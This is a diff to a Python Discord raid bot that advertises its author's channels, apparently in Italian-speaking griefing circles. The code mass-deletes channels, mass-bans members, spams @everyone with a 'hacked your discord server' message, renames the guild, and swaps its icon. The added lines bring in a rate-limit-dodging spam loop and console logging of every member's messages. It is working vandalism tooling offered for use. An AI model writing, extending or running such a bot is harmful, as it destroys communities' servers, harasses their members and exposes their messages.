@@ -12,13 +12,23 @@ os.system('clear')
 
 #######
 
-discordbot_ = os.getenv('token')
+customBot = True
+
+if customBot == False:
+  discordbot_ = os.getenv('token')
+else:
+  discordbot_ = input('Discord bot token: ')
+
 
 consoleRaid_ = False
 
-spamMSG = "@everyone https://t.me/GriefersItaliani\nhttps://github.com/kl3sshydra\nhttps://bit.ly/TheKl3sshydra\nkl3sshydra hacked your discord server.\n\nkl3sshydra non perdona."
+spamMSG = "@everyone https://t.me/kl3sshydra\nhttps://github.com/kl3sshydra\nhttps://bit.ly/TheKl3sshydra\nkl3sshydra hacked your discord server.\n\nkl3sshydra non perdona."
 
-guildname = "cyberlestofantizzato xD"
+
+S = 20
+ran = ''.join(random.choices(string.ascii_uppercase + string.digits, k = S))  
+ran = str(ran)
+guildname = ran
 
 #######
 
@@ -39,7 +49,9 @@ async def on_ready():
     print("\nIf you want to execute bot commands, go on the server you want to execute your commands in and type +help. if you want to raid a specific server in the guild list, insert it here.")
     server = input("-> ")
     print("\nDetecting server..")
+
     await consoleRaid(server)
+
 
 
 async def delete_all_channel(guild):
@@ -73,6 +85,7 @@ async def send_all(guild, message, number):
             counter = counter + 1
         except:
             continue
+
 
 async def consoleSend(guild, number):
     for channel in guild.channels:
@@ -108,6 +121,8 @@ async def consoleRaid(server):
       detect = 1
       print("Detected '"+guild.name+"'")
 
+      guild = discord.utils.get(client.guilds, name=server)
+
       print("Raiding..")
       for channel in guild.id.channels:
             try:
@@ -125,10 +140,24 @@ async def consoleRaid(server):
     print("No server detected.\n\n")
 
 
+async def updateprofilepicture(message, integer):
+  
+  photo = f"{str(integer)}.png"
+  print("Updating profile picture with "+photo)
+
+  try:
+    with open(photo, 'rb') as f:
+      icon = f.read()
+    await message.guild.edit(icon=icon)
+  except Exception as e:
+    print(f"Error: {str(e)}")
+
+  
   
 
 async def raid(message, number, number_):
   print("Raiding..")
+
   for channel in message.guild.channels:
         try:
           if channel != message.channel:
@@ -169,8 +198,24 @@ async def massban(ctx):
       pass
 
 
+async def simpleraid(message, amount):
+  print("Starting simple raid...")
+  for x in range(amount):
+    print("Sending message number: "+str(x))
+    if str(x/10).split('.')[1] == "5":
+      print("Sleeping..")
+      await asyncio.sleep(2)
+      print("Continuing..")
+    await message.channel.send(spamMSG)
+
+
 @client.event
 async def on_message(message):
+
+  if str(message.content) != spamMSG:
+    print(f"[{str(message.guild)}]-({str(message.author)}): {str(message.content)}")
+
+
   if message.author == client.user:
     return
 
@@ -192,6 +237,11 @@ async def on_message(message):
     await clear(message, 1)
     await massban(message)
 
+  if message.content.startswith('+bye'):
+    await clear(message, 1)
+    print("Quiting because "+str(message.author)+" said to.")
+    exit()
+    
 
   if message.content.startswith('+massrole'):
     await clear(message, 1)
@@ -214,6 +264,22 @@ async def on_message(message):
     member = message.author
     role = get(message.guild.roles, name=rolename)
     await member.add_roles(role)
+
+
+  if message.content.startswith('+simple'):
+    try:
+      amount = message.content.split(' ')[1]
+      amount = int(amount)
+    except:
+      amount = 1
+    await simpleraid(message, amount)
+  
+
+  if message.content.startswith('+pic'):
+    integer = message.content.split(' ')[1]
+
+    await clear(message, 1)
+    await updateprofilepicture(message, integer)
 
 
   if message.content.startswith('+cls'):
@@ -239,11 +305,14 @@ async def on_message(message):
 **+massban** -> _bans the entire server._
 **+role [name]** -> _gives yourself a role._
 **+cls [amount]** ->  _clears channel._
+**+bye* ->  _quits._
+**+pic [number]** ->  _updates guild picture._
+**+simple** ->  _spams only one channel._
     """)
-    await asyncio.sleep(4)
-    await clear(message, 2)
 
   
 client.run(discordbot_)
+
+
 
 
